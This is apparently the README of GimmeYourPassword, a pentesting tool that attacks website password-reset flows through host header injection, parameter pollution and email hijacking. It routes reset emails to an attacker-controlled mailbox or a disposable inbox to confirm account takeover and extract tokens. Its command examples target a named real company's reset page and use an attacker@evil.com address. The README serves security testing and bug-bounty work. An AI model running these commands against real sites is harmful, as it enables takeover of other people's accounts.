# GimmeYourPassword

<p align="center">
  <img src="./static/docs/_media/gyp_logo_dark.png" alt="Logo" width="520">
</p>

> GimmeYourPassword (GYP) is a tool designed to perform tests on reset password features on websites and analyze the results to identify vulnerabilities and interesting behaviors.

<div align="center">
<img src="https://img.shields.io/github/v/release/c0dejump/GimmeYourPassword" alt="release version">
<img alt="Python3.7" src="https://img.shields.io/badge/Python-3.7+-informational">
</div>

<br>

<p align="center">
  <a href="https://github.com/c0dejump/GimmeYourPassword/blob/main/CHANGELOG.md">📰 News</a> |
  <a href="https://github.com/c0dejump/GimmeYourPassword/#installation">⚙️ Installation</a> |
  <a href="https://github.com/c0dejump/GimmeYourPassword/#usage">💻 Usage</a> |
  <a href="https://github.com/c0dejump/GimmeYourPassword/#exemples">🧩 Exemples</a> |
  <a href="https://github.com/c0dejump/GimmeYourPassword/#features">🚀 Features</a> |
</p>



## Installation


Follow these steps to install **HExHTTP**:

1. **Clone the repository** to your local machine:
   ```bash
   git clone https://github.com/c0dejump/gimmeyourpassword.git
   ```
2. **Change Directory**   
   ```bash
   cd gimmeyourpassword
   ```
3. **Install** the required dependencies:
   ```bash
   pip install .
   ```



## Usage

```bash
usage: gyp.py [-h] [-u URL] -r RAWREQUEST [-i INTERACT] [-e EMAIL] [--mail-wait MAIL_WAIT] [--disposable-mail] [--reset-url RESET_URL] [-H CUSTOM_HEADER] [-A USER_AGENT] [-hu HUMANS] [-p [PROXY]] [--burp [BURP]]

options:
  -h, --help            show this help message and exit

> General:
  -u URL, --url URL     Optional. Host/path come from -r (the raw request); this only sets the scheme (default https). Pass e.g. -u http://host to force plain HTTP.
  -r RAWREQUEST, --rawrequest RAWREQUEST
                        Raw request file path [required]
  -i INTERACT, --interact INTERACT
                        controlled url or interact
  -e EMAIL, --email EMAIL
                        Attacker-controlled email to hijack the reset to (catch-all: invent any localpart on your sink domain)
  --mail-wait MAIL_WAIT
                        Seconds to wait/poll the mailbox for the hijacked reset email (default: 30)
  --disposable-mail     Auto-provision a throwaway inbox (mail.tm) and use it as -e (no domain/VPS needed)
  --reset-url RESET_URL
                        Reset link OR token pasted from the received email - deep-analyzes the token offline (JWT weak-secret/alg, enumerable id, entropy, time-based)

> Request Settings:
  -H CUSTOM_HEADER, --header CUSTOM_HEADER
                        Add a custom HTTP Header
  -A USER_AGENT, --user-agent USER_AGENT
                        Add a custom User Agent
  -hu HUMANS, --humans HUMANS
                        Performs a timesleep to reproduce human behavior (Default: 0s) value: 'r' or 'random'

> Proxy Settings:
  -p [PROXY], --proxy [PROXY]
                        Proxy all requests (host:port; bare -p defaults to http://127.0.0.1:8080). Useful to bypass WAF client-fingerprinting: the upstream request is then re-issued by Burp, whose TLS/HTTP fingerprint the site already
                        accepts.
  --burp [BURP]         Send behavior and confirmed requests to Burp proxy (host:port, default http://127.0.0.1:8080)

```


## Examples

### Example on a public target
```python3 gyp.py -u "https://accounts.tesla.com/password/forgot" -r req_exemple.txt -i https://xxxx.trycloudflare.com -e attacker@your-domain```



### TOOL TIPS
I use "cloudflared" on my exemples:
- Install it:
  ```curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared && chmod +x cloudflared```
- Run mini_interact.py
  ```python3 mini_interact.py```
- Run cloudflared
  ```./cloudflared tunnel --url http://localhost:8000```

## OOB email capture (confirming the takeover)

Most reset-poisoning bugs are **blind**: the proof is that the *attacker* receives the
reset email. `mini_interact.py` runs a **catch-all SMTP sink** - it accepts **any**
recipient address, so there is **no mailbox to create**. You just invent the `-e`
address; only the domain part matters (it must route to the sink).

`gyp`'s `mail_analysis` module then polls the sink (`/api/mail`), and on a hit prints
`[CRITICAL] account takeover confirmed` with the reset link + token (auto-analyzed),
and flags CC/BCC / multi-recipient injection when victim **and** attacker are both in
the envelope.

**What to put in `-e`:**
- **Local lab** - the domain is irrelevant (point the target app's SMTP at the sink).
  Use any address different from the victim: `-e attacker@evil.com`.
- **Real target** - set your domain's `MX` to the host running the sink
  (`--smtp-port 25`, as root), then `-e anything@your-domain`.

### No domain / no VPS? Use a disposable inbox

`--disposable-mail` provisions a throwaway mailbox on a real, internet-reachable
service (mail.tm), uses it as `-e` automatically, and polls it for the reset email -
**no SMTP sink, no domain, no MX**. Works from a laptop against a real target
(cloudflared not even required). Caveat: disposable domains are sometimes blocklisted.

```bash
# nothing to host - gyp creates the inbox, uses it as -e, analyzes the token
python3 gyp.py -u "https://target/reset" -r req.txt --disposable-mail --mail-wait 60
```

gyp prints the address **and** browser credentials so you can read the mail by hand:

```
[+] Disposable inbox: gyp0dee5c75357f@emalupe.com
[+] Webmail: https://mail.tm/  (login: gyp0dee5c75357f@emalupe.com / <password>)
```

Open https://mail.tm/, log in with that address + password, and read the reset mail.

```bash
# terminal 1 - sink (HTTP dashboard on :8000, SMTP catch-all on :1025)
python3 mini_interact.py --smtp-port 1025          # use --smtp-port 25 on a real VPS
# terminal 2 - expose the dashboard so gyp can read /api/mail
./cloudflared tunnel --url http://localhost:8000
# terminal 3 - scan; -e is where the hijacked mail should land
python3 gyp.py -u "https://target/reset" -r req.txt \
   -i https://xxxx.trycloudflare.com -e pentest@your-domain --mail-wait 60
```

Requires `aiosmtpd` (in `requirements.txt`). Verify routing anytime with
`curl -s http://localhost:8000/api/mail`.

## Features

- Host header injection/pollution
- Parameters pollution
- Absolute uri injection
- Email Hijicking
- Token Analyse
- OOB email capture (catch-all SMTP sink) - confirms takeover & extracts the reset token


### Based on
- https://hacktricks.wiki/en/pentesting-web/reset-password.html
- https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/
- https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/PasswordReset.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover

## Contributing

Pull requests are welcome. Feel free to contribute to this tool and make improvements!